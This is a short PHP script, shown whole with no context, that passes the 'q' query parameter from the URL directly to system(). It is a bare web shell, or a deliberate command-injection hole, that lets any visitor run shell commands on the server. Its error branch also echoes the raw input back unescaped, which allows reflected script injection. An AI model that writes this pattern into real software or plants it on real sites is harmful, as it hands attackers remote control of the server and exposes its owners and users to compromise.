<?php
$input = $_GET['q'];
try {
    system($input);
} catch (Exception $e) {
    echo $input;
}
